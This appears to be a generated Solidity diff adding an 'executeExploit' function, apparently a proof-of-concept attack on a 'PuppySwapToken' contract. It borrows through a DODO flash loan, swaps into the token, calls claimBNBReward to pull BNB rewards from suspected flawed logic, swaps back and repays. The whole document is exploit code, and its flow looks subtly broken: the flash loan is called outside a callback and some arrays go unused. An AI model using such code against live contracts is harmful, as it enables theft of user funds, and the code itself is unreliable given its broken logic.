@@ -1,0 +1,36 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Use the flash loan to get valuableToken
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = amount;
+
+    // Step 2: Call the DPP contract to perform the flash loan
+    IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "");
+
+    // Step 3: Exchange valuableToken for tokens
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = token; // PuppySwapToken
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amounts[0], 0, path, address(this), block.timestamp);
+
+    uint256 puppyBalance = IPuppySwapToken(token).balanceOf(address(this));
+    
+    // Step 4: Perform arbitrary operations that benefit from potentially bad logic in the PuppySwapToken
+    IPuppySwapToken(token).claimBNBReward(); // Claim BNB reward
+    uint256 reward = address(this).balance; // Get the claimed BNB
+    console.log("Claimed reward: %s", reward);
+
+    // Step 5: Swap any remaining tokens back to valuableToken
+    path[0] = token; // PuppySwapToken
+    path[1] = address(valuableToken);
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(puppyBalance, 0, path, address(this), block.timestamp);
+
+    // Step 6: Repay the flash loan
+    uint256 repaymentAmount = amounts[0];
+    valuableToken.transfer(flashloanProvider, repaymentAmount);
+}
+</executeExploitCode>
+```
